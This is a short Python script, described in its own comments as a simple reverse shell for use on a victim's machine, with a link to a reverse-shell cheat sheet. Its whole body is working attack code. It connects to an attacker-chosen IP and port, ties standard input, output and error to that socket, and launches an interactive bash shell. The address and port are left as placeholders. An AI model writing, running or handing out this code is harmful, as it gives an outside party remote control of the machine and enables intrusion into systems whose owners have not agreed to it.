#!/usr/bin/python3
# simple python reverse shell meant to be used on victim/target machine
# various other methods: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
from os import dup2
from subprocess import run
import socket
#################
ip=<enter ip>
port=<enter port>
#################
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((str(ip),port)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"]) 
